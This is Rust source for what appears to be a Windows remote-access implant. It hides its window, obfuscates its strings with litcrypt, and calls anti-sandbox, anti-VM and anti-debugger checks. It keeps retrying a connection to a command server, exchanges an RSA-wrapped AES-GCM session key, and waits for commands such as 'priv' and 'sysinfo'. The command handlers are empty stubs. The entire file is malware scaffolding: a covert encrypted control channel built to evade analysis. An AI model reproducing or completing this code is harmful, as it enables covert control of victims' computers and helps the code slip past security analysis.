#![windows_subsystem = "windows"]

use std::io::{Read, Write};
use std::net::TcpStream;
use std::thread::sleep;
use std::time;

use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Key, Nonce,
};
use rand::{distributions::Alphanumeric, Rng};
use rsa::{pkcs1::DecodeRsaPublicKey, Pkcs1v15Encrypt, RsaPublicKey};

mod evasion;

#[macro_use]
extern crate litcrypt;

use_litcrypt!();

struct EncryptedTunnel {
    key: Vec<u8>,
    nonce: Vec<u8>,
    cipher: Aes256Gcm,
    socket: TcpStream,
}
impl EncryptedTunnel {
    fn new(key: Vec<u8>, nonce: Vec<u8>, socket: TcpStream) -> Self {
        Self {
            cipher: Aes256Gcm::new(&Key::<Aes256Gcm>::from_slice(&key)),
            key,
            nonce,
            socket,
        }
    }

    fn send(&mut self, c: Vec<u8>) -> Option<()> {
        match self.socket.write_all(
            self.cipher
                .encrypt(Nonce::from_slice(self.nonce.as_slice()), c.as_slice())
                .unwrap()
                .as_slice(),
        ) {
            Ok(_) => Some(()),
            Err(_) => None,
        }
    }
    fn recv(&mut self) -> Vec<u8> {
        let mut buf = [0; 1024];
        let bread = self.socket.read(&mut buf).unwrap();
        buf[..bread].to_vec()
    }
}

fn random_bytes(l: usize) -> Vec<u8> {
    let rand: String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(l)
        .map(char::from)
        .collect();
    rand.as_bytes().to_vec()
}

fn init_conn() {
    let key = random_bytes(32);
    let nonce = random_bytes(12);

    let mut rng = rand::thread_rng();

    let mut client: TcpStream = loop {
        match TcpStream::connect("127.0.0.1:9035") {
            Ok(r) => break r,
            Err(_) => { 
                sleep(time::Duration::from_secs(1));
                continue
            }
        }
    };

    let mut pubkey = [0; 1024];
    let bread = client.read(&mut pubkey).unwrap();

    let pubkey = RsaPublicKey::from_pkcs1_pem(
        String::from_utf8_lossy(&pubkey[..bread])
            .to_string()
            .as_str(),
    )
    .unwrap();

    let mut etunnel = EncryptedTunnel::new(key, nonce, client);

    etunnel
        .socket.write_all(
            pubkey
                .encrypt(
                    &mut rng,
                    Pkcs1v15Encrypt,
                    format!(
                        "{}&{}",
                        String::from_utf8(etunnel.key.clone()).unwrap(),
                        String::from_utf8(etunnel.nonce.clone()).unwrap()
                    )
                    .as_bytes(),
                )
                .unwrap().as_slice(),
        )
        .unwrap();

    connection(etunnel);
}

#[cfg(target_os = "windows")]
fn connection(mut etunnel: EncryptedTunnel) {
    loop {
        let msg = String::from_utf8(etunnel.recv()).unwrap();

        match msg.as_str() {
            "priv" => {

            },
            "sysinfo" => {

            },
            "ipconfig" => {

            }
            _ => ()
        }
    }
}
#[cfg(not(target_os = "windows"))]
fn connection(_: EncryptedTunnel) {
    panic!("Only windows")
}

fn main() {
    #[cfg(target_os = "windows")]
    if evasion::antisnb() || evasion::antivm() || evasion::antidbg() {
        init_conn();
    }
    #[cfg(not(target_os = "windows"))]
    init_conn();
}
